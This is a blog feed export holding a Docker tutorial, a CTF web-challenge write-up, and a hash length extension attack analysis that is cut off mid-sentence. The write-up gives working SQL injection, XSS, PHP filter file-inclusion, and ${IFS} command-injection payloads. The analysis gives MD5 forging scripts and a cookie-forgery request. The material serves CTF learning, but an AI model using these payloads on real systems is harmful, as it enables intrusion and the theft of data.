    <content type="text"><![CDATA[docker在平时的使用中还是比较常见的，这里简单介绍一下docker以及其使用方法，希望对大家有用 docker在平时的使用中还是比较常见的，这里简单介绍一下docker以及其使用方法，希望对大家有用。0x01 初识dockerDocker 从 0.9 版本开始使用 libcontainer 替代 lxc，libcontainer 和 Linux 系统的交互图如下： 并且docker安装容器的操作系统位数和物理机是统一的，也就是说64位操作系统只能使用64位docker容器，docker分为image和容器，一个镜像可以生成多个容器，并且容器的环境是相同的。0x02 基本指令参数： –name 指定容器的名字 –rm 容器运行完毕会自动删除 -i -t 创建一个提供交互式shell的容器。 -d 在后台运行容器，并且打印出容器的ID。 后面加的是容器刚生成是运行的程序默认是/bin/bash0x1 容器生成docker run –name weblogic -i -t centos 上述命令会生成一个名字为weblogic 的交互式容器，默认执行的是/bin/bash，所以会进入交互界面。如果本地没有centos的镜像会从远程下载到本地。0x2 生成容器时的其他属性docker run 命令用于生成容器 ，生成容器的属性之后不能再改变端口映射一般拥有web服务的容器都进行端口映射，将docker的80端口映射到主机的8000端口 docker run -d -p 8000:80 foo/live /bin/bash环境变量在配置mysql docker的时候使用-e参数设置环境变量 docker run –name first-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql0x3 打开/关闭/附加/删除docker start id 使上述生成的容器启动 docker stop id 使上述生成的容器关闭 docker exec -it id /bin/bash 附加正在运行的容器 docker attach continer id/name 当重新启动容器时，会沿用创建容器（docker run）命令时指定的参数来运行，可能需要按回车才进入。 这时就已经相当于在容器内部了的shell操作了。如果操作过程中，退出了shell。容器也会随之停止。exec与attach的区别是当exit容器的时候exec不停止容器，而attach会将容器停止删除时必须保证容器时关闭的 docker rm name/id 删除指定容器 删除所有镜像 docker rmi $(docker images -q)1 根据格式删除所有镜像 docker rm $(docker ps -qf status=exited)0x4 压缩/导出/上传我们用镜像生成了容器，然后我们可以将容器生成镜像，然后将镜像打成压缩包方便导入导出，同时也可以把镜像上传至dockerhub，供别人下载使用压缩(容器)我们使用容器 furious_bell，现在要将这个容器保存为一个文件 myunbuntu-export-1204.tar docker export furious_bell &gt; /home/myubuntu-export-1204.tar导入docker import /home/myubuntu-export-1204.tar alias压缩（镜像）这里有个基础镜像：ubuntu:12.04，现在要将这个镜像保存为一个文件myubuntu-save-1204.tar docker save 9610cfc68e8d &gt; /home/myubuntu-save-1204.tar 有点慢，稍微等待一下，没有任何warn信息就表示保存OK。9610cfc68e8d 是镜像ID导入docker load /home/myubuntu-export-1204.tar alias上传至远程仓库首先拥有一个dockerhub账号 上传之前要登录 docker login 然后输入用户名密码docker push image name关于docker file的编写，有时间再补上0x3 Dockerfile 编写Dockfile是一种被Docker程序解释的脚本，Dockerfile由一条一条的指令组成，每条指令对应Linux下面的一条命令。Docker程序将这些Dockerfile指令翻译真正的Linux命令。Dockerfile有自己书写格式和支持的命令，Docker程序解决这些命令间的依赖关系，类似于Makefile。首先给个实例 运行指令docker build -t name .FROM ubuntu:16.04MAINTAINER 4t10n &lt;act01n@163.com&gt;ENV DEBIAN_FRONTEND noninteractive#这里添加更新源 RUN sed -i ‘s/archive.ubuntu.com/mirrors.ustc.edu.cn/g’ /etc/apt/sources.listRUN apt-get update -y &amp;&amp; \ apt-get install -y apache2 \ vim \ tar \ php7.0-fpm \ php7.0-mcrypt \ php7.0-mysql \ mysql-client \ mysql-server \ &amp;&amp; /etc/init.d/mysql start \ &amp;&amp; mysqladmin -uroot password root \ &amp;&amp; rm -rf /var/lib/apt/lists/WORKDIR /tmp#COPY ./start.sh /tmp/#COPY ./init.sql /tmp/ #RUN chmod a+x start.sh #设置数据库 RUN set -x \ &amp;&amp; service mysql start \ &amp;&amp; mysql -e “CREATE DATABASE blog DEFAULT CHARACTER SET utf8;” -uroot -proot \ &amp;&amp; mysql -e “grant select,insert on blog. to ‘admin’@’localhost’ identified by ‘password’ “ -uroot -proot# copy 源码#COPY ./default /etc/nginx/sites-available/default#COPY ./src /usr/share/nginx/html/COPY ./1.php /var/www/html/# 设置可写权限 RUN chown -R www-data:www-data /var/www/html/EXPOSE 80 3306CMD [“/tmp/start.sh”]0x1 FROMFROM指定一个基础镜像， 一般情况下一个可用的 Dockerfile一定是 FROM 为第一个指令。0x2 MAINTAINER这里是用于指定镜像制作者的信息0x3 RUNRUN命令将在当前image中执行任意合法命令并提交执行结果。命令执行提交后，就会自动执行Dockerfile中的下一个指令。 层级 RUN 指令和生成提交是符合Docker核心理念的做法。它允许像版本控制那样，在任意一个点，对image 镜像进行定制化构建。0x4 ENVENV指令可以用于为docker容器设置环境变量 ENV设置的环境变量，可以使用 docker inspect命令来查看。同时还可以使用docker run –env =来修改环境变量。0x5 WORKDIRWORKDIR 用来切换工作目录的。Docker 默认的工作目录是/，只有 RUN 能执行 cd 命令切换目录，而且还只作用在当下下的 RUN，也就是说每一个 RUN 都是独立进行的。如果想让其他指令在指定的目录下执行，就得靠 WORKDIR。WORKDIR 动作的目录改变是持久的，不用每个指令前都使用一次 WORKDIR。0x6 COPYCOPY 将文件从路径&lt;src&gt;复制添加到容器内部路径 &lt;dest&gt;&lt;src&gt;必须是想对于源文件夹的一个文件或目录，也可以是一个远程的url，&lt;dest&gt; 是目标容器中的绝对路径。 所有的新文件和文件夹都会创建UID 和 GID 。事实上如果&lt;src&gt; 是一个远程文件URL，那么目标文件的权限将会是600。0x7 ADDADD 将文件从路径 复制添加到容器内部路径 同COPY0x8 EXPOSEEXPOSE 指令指定在docker允许时指定的端口进行转发。0x9 CMDDockerfile.中只能有一个CMD指令。 如果你指定了多个，那么最后个CMD指令是生效的。 CMD指令的主要作用是提供默认的执行容器。这些默认值可以包括可执行文件，也可以省略可执行文件。 当你使用shell或exec格式时， CMD 会自动执行这个命令。]]></content>
      <tags>
        <tag>软件及应用配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup]]></title>
    <url>%2F2017%2F08%2F14%2F2017%E5%90%88%E5%A4%A9%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B%E4%B8%93%E9%A2%98%E8%B5%9B--%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup%2F</url>
    <content type="text"><![CDATA[趁着放假，再刷一波题目 趁着放假，再刷一波题目0x01 捉迷藏链接 这个有个假flag，太坑了，查看源码有个链接点进去就是flag0x02 简单问答链接 答案是 2016 lol 22 记得把q4改成q3，js会有函数干扰 ，用burpsuit就ok0x03 后台后台后台链接 PHPSESSID=qoercfqn062v19035374ten1d2; User=JohnTan101; Member=Tm9ybWFs 提示用admin登录 发现 member是base64编码的将Admin用base64编码提交即可0x04 php是最好的语言链接&lt;?phpshow_source(FILE);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET[‘foo’]);if(is_array($a)){ is_numeric(@$a[“bar1”])?die(“nope”):NULL; if(@$a[“bar1”]){ ($a[“bar1”]&gt;2016)?$v1=1:NULL; } if(is_array(@$a[“bar2”])){ if(count($a[“bar2”])!==5 OR !is_array($a[“bar2”][0])) die(“nope”); $pos = array_search(“nudt”, $a[“a2”]); $pos===false?die(“nope”):NULL; foreach($a[“bar2”] as $key=&gt;$val){ $val===“nudt”?die(“nope”):NULL; } $v2=1; }}$c=@$_GET[‘cat’];$d=@$_GET[‘dog’];if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ eregi(“3|1|c”,$d.$c[0])?die(“nope”):NULL; strpos(($c[0].$d), “htctf2016”)?$v3=1:NULL; }}if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include “flag.php”; echo $flag;}?&gt;这个好像是去年的题目，做了好几次，说点不一样的 1. 记住一点字符串与数字比较时会先转换成数字再比较 2. 还有一点$pos = array_search(“nudt”, $a[“a2”]);这个在绕过的时候也是利用上面的那一点，所以有0就可以了 3. eregi的%00截断0x5 login链接 打开一看典型的文件包含，利用PHP协议读取所有源码 利用方法http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=mainindex.php&lt;?php$pwhash=“ffd313052dab00927cb61064a392f30ee454e70f”;if (@$_GET[‘log’]) { if(file_exists($_GET[‘log’].“.log”)){ include(“flag.txt”);}}if(@$_GET[‘page’] != ‘index’){ include((@$_GET[‘page’]?$_GET[‘page’].“.php”:“main.php”));}?&gt;login.php&lt;?php$login=@$_POST[‘login’];$password=@$_POST[‘password’];if(@$login==“admin” &amp;&amp; sha1(@$password)==$pwhash){ include(‘flag.txt’);}else if (@$login&amp;&amp;@$password&amp;&amp;@$_GET[‘debug’]) { echo “Login error, login credentials has been saved to ./log/“.htmlentities($login).“.log”; $logfile = “./log/“.$login.“.log”; file_put_contents($logfile, $login.“\n”.$password);}?&gt; &lt;center&gt; login&lt;br/&gt;&lt;br/&gt; &lt;form action=“” method=“POST”&gt; &lt;input name=“login” placeholder=“login”&gt;&lt;br/&gt; &lt;input name=“password” placeholder=“password”&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type=“submit” value=“Go!”&gt; &lt;/form&gt; &lt;/center&gt;代码逻辑很明确,首先在login.php生成./log/xxx.log 接着访问index.php即可0x06 http 头注入链接 经过一番测试发现在referer处有报错具体的利用方法是insert注入，可以参考我以前写的文章具体的payload:1123’ or extractvalue(1,concat(0x5c,(select flag from flag))) or ‘’,’123’)#0x07 简单的文件上传链接 不懂是什么意思 上传个php文件就可以0x08 简单的JS链接这个也是摸不到头脑，赋值粘贴执行初来链接 http://218.76.35.75:20123/fl0a.php 查看cookie 得到flag0x09 php 是门松散的语言链接 可以把它归结为简单的变量覆盖 parse_str导致的漏洞 最后的payload http://218.76.35.75:20124/?heetian=he%3Dabcd0x0a 试试xss链接 有回显的 ‘ onerror=”javasript:alert(document.domain)”0x0b 简单的文件包含链接 直接包含文件,看源码得到flag0x0c 简单的验证链接 看cookie有个guess字段 直接爆破admin对应的guess值0x0d vote链接 这个题目，和我出的一道题目神似下载链接 找到备份源码之后用虚拟机vim还原&lt;?phpinclude ‘db.php’;session_start();if (!isset($_SESSION[‘login’])) { $_SESSION[‘login’] = ‘guest’.mt_rand(1e5, 1e6);}$login = $_SESSION[‘login’];if (isset($_POST[‘submit’])) { if (!isset($_POST[‘id’], $_POST[‘vote’]) || !is_numeric($_POST[‘id’])) die(‘please select …’); $id = $_POST[‘id’]; $vote = (int)$_POST[‘vote’]; if ($vote &gt; 5 || $vote &lt; 1) $vote = 1; $q = mysql_query(“INSERT INTO t_vote VALUES ({$id}, {$vote}, ‘{$login}’)”); $q = mysql_query(“SELECT id FROM t_vote WHERE user = ‘{$login}’ GROUP BY id”); echo ‘&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;’; echo ‘&lt;table border=”1”&gt;’; echo ‘&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;’; while ($r = mysql_fetch_array($q)) { $arr = mysql_fetch_array(mysql_query(“SELECT title FROM t_picture WHERE id = “.$r[‘id’])); echo ‘&lt;tr&gt;&lt;td&gt;’.$arr[0].‘&lt;/td&gt;’; $arr = mysql_fetch_array(mysql_query(“SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = “.$r[‘id’])); echo ‘&lt;td&gt;’.$arr[0].‘&lt;/td&gt;&lt;td&gt;’.round($arr[1],2).‘&lt;/td&gt;&lt;/tr&gt;’; } echo ‘&lt;/table&gt;’; echo ‘&lt;br&gt;&lt;a href=”index.php”&gt;goBack&lt;/a&gt;&lt;br&gt;’; exit;}?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Movie vote&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Welcome, Movie vote&lt;/p&gt;&lt;form action=“index.php” method=“POST”&gt;&lt;table border=“1” cellspacing=“5”&gt;&lt;tr&gt;&lt;?php$q = mysql_query(‘SELECT * FROM t_picture’);while ($r = mysql_fetch_array($q)) { echo ‘&lt;td&gt;&lt;img src=”./images/‘.$r[‘image’].‘“&gt;&lt;div align=”center”&gt;’.$r[‘title’].‘&lt;br&gt;&lt;input type=”radio” name=”id” value=”‘.$r[‘id’].‘“&gt;&lt;/div&gt;&lt;/td&gt;’;}?&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;Your vote:&lt;select name=“vote”&gt;&lt;option value=“1”&gt;1&lt;/option&gt;&lt;option value=“2”&gt;2&lt;/option&gt;&lt;option value=“3”&gt;3&lt;/option&gt;&lt;option value=“4”&gt;4&lt;/option&gt;&lt;option value=“5”&gt;5&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;&lt;input type=“submit” name=“submit” value=“Submit”&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;经过观察可控字段只能是id 所以id是注入点 经过二次注入之后，找到flag 写的不太详细，不懂得可以私我0x0e GG链接 利用网页js美化 找到关键点，结束时的处理函数 this.mayAdd = function (a) { if (this.scores.length &lt; this.maxscores) return 1E6 &lt; a &amp;&amp; (a = new p, a.set(“urlkey”, “webqwer” [1] + “100.js”, 864E5)), !0; for (var b = this.scores.length - 1; 0 &lt;= b; –b) if (this.scores[b].score &lt; a) return 1E6 &lt; a &amp;&amp; (a = new p, a.set(“urlkey”, “webqwer” [1] + “100.js”, 864E5)), !0; return !1 };访问e100.js 得到另一种js编码方式，直接console执行代码及可0x0f Reappear链接 直接查找相关漏洞漏洞内容路径泄露 找到 flag文件名已经找到了 直接搜索就OK/var/www/html/Web/kind/kindeditor/attached/flag_clue.php0x10 DrinkCoffee链接 直接改两个字段 referer和X_FORWARDED_FOR 0x11 最安全的笔记管理系统链接 这道题目的思路挺不错的0x1 SQL注入分析一开始拿到题目以为是SQL注入，首先分析一下waf检测 发现是有转义的，所以又测试了编码绕过，无果。 下面开始寻找二次注入的地方，也没有发现。 那么注入是不可能的了0x2 代码审计因为SQL注入无果所以开始转向其他思路。发现网页本身存在文件包含漏洞，利用PHP filter协议进行读取PHP代码 得到整个源代码后开始代码审计 登录之后会有session以及cookie的设置 在目录扫描之后发现有admin目录，admin/index.php有用户身份检测 同时$userid!==false&amp;&amp;level!==false 应为初始值的原因所以$userid!==false&amp;&amp;level!==false是成立的 下面就看身份检测函数就可以了 如果是想要绕过这里的检测 我们必须要知道SECURITY_KEY的值，也就是要知道rand的值。后来搜了一下找到了相关知识 这里写链接内容 于是在本地测试是可以登录admin的但是在本题死活登不上，下面的工作就是二次注入。因为没有登录admin所以也没有继续写。0x12 Document链接 试了半天，还好有同学提示，这题考察的是apache解析漏洞0x13 阳光总在风雨后链接 一开始会检测username所以在这里存在有盲注 绕过姿势uname=admin’/1=(1=(exists(select(1)from(admin))))/‘1’=’1&amp;passwd=ad 或者1’%(1)%’1 或者 1’^!1^’1 脚本就不贴了，如果不会可以参考我以前的博客 得到密码50f87a3a3ad48e26a5d9058418fb78b5 碰撞得到shuangshuang 后面是一个命令执行的绕过 可以用${IFS}也可以是其他这里有些小trick 最后只显示最后一行 这里可以用tail -n +3000 | head -n 1000指定显示第几行 搜索到9ef89ad913e848b64b73e3aa721e44e4目录 接着找到flag文件ls${IFS}/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/|head${IFS}-n${IFS}10x14 default链接首先是扫描到index2.php 接着就好写了]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hash length extension attacks 分析]]></title>
    <url>%2F2017%2F07%2F04%2FHash%20length%20extension%20attacks%20%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste 0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一step 3 利用hash拓展攻击没有必要最近突然想把以前做的哈希拓展长度攻击的原理给梳理一下，前一段时间梳理了 padding oracle attack的相关知识，打算从原理到题目都详细的讲一讲,使用条件比较苛刻需要攻击者明密文都可控，所以在平时这种漏洞很少见，后面主要介绍一下工具的使用方法以及，jarvis平台上的一道题目，以及2017年陕西省信息安全竞赛的最后一道题目admin哈希拓展可以伪造任意一对明密文，前提是有一对明密文，且伪造的明文前512比特是固定的···0x00 MD5加密原理一些dalao的博客这一点已经说得很清楚了，例如 Assassin师傅的博文0x1 字节填充MD5在进行运算时，需要将bit位数填充到指定位数，使其长度在对 512bit 取模后的值为 448bit，留下的64bit用来填写未填充的明文长度0x2 分组加密把填充过的（注意如果明文大于512bit，将分成多个组进行加密）明文按512bit一组进行下述加密我们可以看到初始向量IV为128bit，每组加密过之后当做下一组的向量进行运算。最后输出的128bit就是md5值0x3 实例演示前面MD5的加密逻辑说得很清楚，这里利用一个实例模拟一下加密过程 加密数据Value十六进制0x61646d696e填充之后0x61646d696e+0x80+500x00+0x28+0x007首先字节填充，比特第一位补位1，其余位为0所以为0x80 后面全是0字节填充一直到448bit截止，剩下的8byte按照小端方式存储。admin占位5字节所以40bit=0x28bit。 这就是基本的MD5加密算法的流程，有没有看懂？？如果看懂了有没有发现攻击者的可乘之机？？0x01 攻击原理上篇稍微讲了一下，MD5加密的原理，这里主要讲解攻击方法 假设我们已经知道md5($secret+”admin”+”admin”)的值hash1 其实就是iv 与 $secret+”admin”+”admin”的填充值（这里填充了512bit）的hash值 现在假设我们有自己的hash算法可以构造任意的初始iv可以填充任意参与计算的明文 现在有以下结论 如果我要md5（$secret+”admin”+”admin”+第一组MD5填充+padding）这里的第一组md5分组就是md5（$secret+”admin”+”admin”）时的填充之后的512bit块 那么此值应该在逻辑上等于我利用hash1当做初始向量加密我构造的padding+填充字节（注意这里的填充是算上第一块的长度的即512bit）的第二块生成的md5值简单的将就是md5（$secret+”admin”+”admin”+第一组MD5填充+padding）=(hash1)md5(padding+填充字节)0x02 攻击脚本这里引用别人写的脚本0x1 md5 python 实现可以自定义iv值#!/usr/bin/env python# -- coding: utf-8 --# @Author：DshtAnger# theory reference:# blog：# http://blog.csdn.net/adidala/article/details/28677393# http://blog.csdn.net/forgotaboutgirl/article/details/7258109# http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html# RFC1321：# https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf##############################################################################import sysdef genMsgLengthDescriptor(msg_bitsLenth): ‘’’ —args: msg_bitsLenth : the bits length of raw message –return: 16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding ‘’’ return import(“struct”).pack(“&gt;Q”,msg_bitsLenth).encode(“hex”)def reverse_hex_8bytes(hex_str): ‘’’ –args: hex_str: a hex-encoded string with length 16 , i.e.8bytes –return: transform raw message descriptor to little-endian ‘’’ hex_str = “%016x”%int(hex_str,16) assert len(hex_str)==16 return import(“struct”).pack(“&lt;Q”,int(hex_str,16)).encode(“hex”)def reverse_hex_4bytes(hex_str): ‘’’ –args: hex_str: a hex-encoded string with length 8 , i.e.4bytes –return: transform 4 bytes message block to little-endian ‘’’ hex_str = “%08x”%int(hex_str,16) assert len(hex_str)==8 return import(“struct”).pack(“&lt;L”,int(hex_str,16)).encode(“hex”)def deal_rawInputMsg(input_msg): ‘’’ –args: input_msg : inputed a ascii-encoded string –return: a hex-encoded string which can be inputed to mathematical transformation function. ‘’’ ascii_list = [x.encode(“hex”) for x in input_msg] length_msg_bytes = len(ascii_list) length_msg_bits = len(ascii_list)8 #padding ascii_list.append(‘80’) while (len(ascii_list)8+64)%512 != 0: ascii_list.append(‘00’) #add Descriptor ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits))) return “”.join(ascii_list)def getM16(hex_str,operatingBlockNum): ‘’’ –args: hex_str : a hex-encoded string with length in integral multiple of 512bits operatingBlockNum : message block number which is being operated , greater than 1 –return: M : result of splited 64bytes into 416 message blocks with little-endian ‘’’ M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128(operatingBlockNum-1),128operatingBlockNum,8)] return M#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数def T(i): result = (int(4294967296abs(import(“math”).sin(i))))&amp;0xffffffff return result#定义每轮中用到的函数#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位F = lambda x,y,z:((x&amp;y)|((~x)&amp;z))G = lambda x,y,z:((x&amp;z)|(y&amp;(~z)))H = lambda x,y,z:(x^y^z)I = lambda x,y,z:(y^(x|(~z)))RL = L = lambda x,n:(((x&lt;&lt;n)|(x&gt;&gt;(32-n)))&amp;(0xffffffff))def FF(a, b, c, d, x, s, ac): a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return adef GG(a, b, c, d, x, s, ac): a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return adef HH(a, b, c, d, x, s, ac): a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return adef II(a, b, c, d, x, s, ac): a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return adef show_md5(A,B,C,D): return “”.join( [ “”.join(import(“re”).findall(r”..”,“%08x”%i)[::-1]) for i in (A,B,C,D) ] )def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=“”): a = A b = B c = C d = D for i in xrange(0,len(readyMsg)/128): M = getM16(readyMsg,i+1) for i in xrange(16): exec “M”+str(i)+“=M[“+str(i)+“]” #First round a=FF(a,b,c,d,M0,7,0xd76aa478L) d=FF(d,a,b,c,M1,12,0xe8c7b756L) c=FF(c,d,a,b,M2,17,0x242070dbL) b=FF(b,c,d,a,M3,22,0xc1bdceeeL) a=FF(a,b,c,d,M4,7,0xf57c0fafL) d=FF(d,a,b,c,M5,12,0x4787c62aL) c=FF(c,d,a,b,M6,17,0xa8304613L) b=FF(b,c,d,a,M7,22,0xfd469501L) a=FF(a,b,c,d,M8,7,0x698098d8L) d=FF(d,a,b,c,M9,12,0x8b44f7afL) c=FF(c,d,a,b,M10,17,0xffff5bb1L) b=FF(b,c,d,a,M11,22,0x895cd7beL) a=FF(a,b,c,d,M12,7,0x6b901122L) d=FF(d,a,b,c,M13,12,0xfd987193L) c=FF(c,d,a,b,M14,17,0xa679438eL) b=FF(b,c,d,a,M15,22,0x49b40821L) #Second round a=GG(a,b,c,d,M1,5,0xf61e2562L) d=GG(d,a,b,c,M6,9,0xc040b340L) c=GG(c,d,a,b,M11,14,0x265e5a51L) b=GG(b,c,d,a,M0,20,0xe9b6c7aaL) a=GG(a,b,c,d,M5,5,0xd62f105dL) d=GG(d,a,b,c,M10,9,0x02441453L) c=GG(c,d,a,b,M15,14,0xd8a1e681L) b=GG(b,c,d,a,M4,20,0xe7d3fbc8L) a=GG(a,b,c,d,M9,5,0x21e1cde6L) d=GG(d,a,b,c,M14,9,0xc33707d6L) c=GG(c,d,a,b,M3,14,0xf4d50d87L) b=GG(b,c,d,a,M8,20,0x455a14edL) a=GG(a,b,c,d,M13,5,0xa9e3e905L) d=GG(d,a,b,c,M2,9,0xfcefa3f8L) c=GG(c,d,a,b,M7,14,0x676f02d9L) b=GG(b,c,d,a,M12,20,0x8d2a4c8aL) #Third round a=HH(a,b,c,d,M5,4,0xfffa3942L) d=HH(d,a,b,c,M8,11,0x8771f681L) c=HH(c,d,a,b,M11,16,0x6d9d6122L) b=HH(b,c,d,a,M14,23,0xfde5380c) a=HH(a,b,c,d,M1,4,0xa4beea44L) d=HH(d,a,b,c,M4,11,0x4bdecfa9L) c=HH(c,d,a,b,M7,16,0xf6bb4b60L) b=HH(b,c,d,a,M10,23,0xbebfbc70L) a=HH(a,b,c,d,M13,4,0x289b7ec6L) d=HH(d,a,b,c,M0,11,0xeaa127faL) c=HH(c,d,a,b,M3,16,0xd4ef3085L) b=HH(b,c,d,a,M6,23,0x04881d05L) a=HH(a,b,c,d,M9,4,0xd9d4d039L) d=HH(d,a,b,c,M12,11,0xe6db99e5L) c=HH(c,d,a,b,M15,16,0x1fa27cf8L) b=HH(b,c,d,a,M2,23,0xc4ac5665L) #Fourth round a=II(a,b,c,d,M0,6,0xf4292244L) d=II(d,a,b,c,M7,10,0x432aff97L) c=II(c,d,a,b,M14,15,0xab9423a7L) b=II(b,c,d,a,M5,21,0xfc93a039L) a=II(a,b,c,d,M12,6,0x655b59c3L) d=II(d,a,b,c,M3,10,0x8f0ccc92L) c=II(c,d,a,b,M10,15,0xffeff47dL) b=II(b,c,d,a,M1,21,0x85845dd1L) a=II(a,b,c,d,M8,6,0x6fa87e4fL) d=II(d,a,b,c,M15,10,0xfe2ce6e0L) c=II(c,d,a,b,M6,15,0xa3014314L) b=II(b,c,d,a,M13,21,0x4e0811a1L) a=II(a,b,c,d,M4,6,0xf7537e82L) d=II(d,a,b,c,M11,10,0xbd3af235L) c=II(c,d,a,b,M2,15,0x2ad7d2bbL) b=II(b,c,d,a,M9,21,0xeb86d391L) A += a B += b C += c D += d A = A&amp;0xffffffff B = B&amp;0xffffffff C = C&amp;0xffffffff D = D&amp;0xffffffff a = A b = B c = C d = D return show_md5(a,b,c,d)0x2 计算脚本#!/usr/bin/env python# -- coding: utf-8 --# @Author：DshtAngerimport my_md5import hashlibimport urllibimport binasciiimport refrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long#reference:# http://www.freebuf.com/articles/web/69264.html#problem link:# http://ctf4.shiyanbar.com/web/kzhan.phpsamplehash=“ec82a52bac65135157dfa73daa3548b1”‘’’res = re.findall(‘.{8}’,samplehash)print ress = ‘03194d72’print cs1 = “”print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])‘’’s =[]res = re.findall(‘.{8}’,samplehash)print resfor i in res: ss = “” ss = ss.join([i[j-2]+i[j-1] for j in xrange(len(i),0,-2)]) s.append(bytes_to_long(binascii.a2b_hex(ss)))print [hex(i) for i in s]# 084e0343 a0486ff0 5530df6c 705c8bb4#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书s1=s[0]s2=s[1]s3=s[2]s4=s[3]#expsecret = “a”15secret_admin=“xxxxxguest”+‘\x80’+‘\x00’45+‘\x50’+‘\x00’7+“admin”r = my_md5.deal_rawInputMsg(secret_admin)inp = r[len(r)/2:] #我们需要截断的地方，也是我们需要控制的地方#print r#print inpprint “getmein:”+my_md5.run_md5(s1,s2,s3,s4,inp)print “getmein:”+hashlib.md5(secret_admin).hexdigest()0x03 实例演示0x1 简单实例&lt;?php$SECRET=“xxxxx”;$auth = “guest”;if (isset($_COOKIE[“auth”])) { $hsh = $_COOKIE[“hsh”]; if ($hsh === md5($SECRET . $_COOKIE[“auth”])) { die(“flag{I_L0vE_L0li}”); }} else { setcookie(“auth”, $auth); setcookie(“hsh”, md5($SECRET.$auth));}?&gt;#!/usr/bin/env python# -- coding: utf-8 --# @Author：DshtAngerimport my_md5import hashlibimport urllibimport binasciiimport refrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long#reference:# http://www.freebuf.com/articles/web/69264.html#problem link:# http://ctf4.shiyanbar.com/web/kzhan.phpsamplehash=“06be518adbb45a90440c98bb364d4cf8”‘’’res = re.findall(‘.{8}’,samplehash)print ress = ‘03194d72’print cs1 = “”print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])‘’’s =[]res = re.findall(‘.{8}’,samplehash)print resfor i in res: ss = “” ss = ss.join([i[j-2]+i[j-1] for j in xrange(len(i),0,-2)]) s.append(bytes_to_long(binascii.a2b_hex(ss)))print [hex(i) for i in s]# 084e0343 a0486ff0 5530df6c 705c8bb4#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书s1=s[0]s2=s[1]s3=s[2]s4=s[3]#expsecret = “a”15secret_admin=“yyyyyyyyzzzzzzzadminadmin”+‘\x80’+‘\x00’30+‘\xc8’+‘\x00’7+“admin”r = my_md5.deal_rawInputMsg(secret_admin)inp = r[len(r)/2:] #我们需要截断的地方，也是我们需要控制的地方#print r#print inpprint “getmein:”+my_md5.run_md5(s1,s2,s3,s4,inp)print “getmein:”+hashlib.md5(secret_admin).hexdigest() 自己写个访问脚本就可以获取flagimport requestsse = requests.session()cookies = { ‘hsh’:‘9b012140133ad92facec4f297bcd2d92’, ‘auth’:“admin”+‘\x80’+‘\x00’30+‘\xc8’+‘\x00’7+“admin”}re = se.post(url=“http://45.78.29.252/hash.php“,cookies=cookies)print re.content当然也可以直接用burp0x2 jarvisoj flag在管理员手里首先我介绍一个开源工具hash_extender 具体的使用方法我这里就不在介绍了 主要介绍一下使用参数-d 被扩展的明文-a 附加的到原来hash的padding-l 盐的长度-f 加密方式-s 带盐加密的hash值--out-data-format 输出格式--quiet 仅输出必要的值题目中有备份文件泄露所以 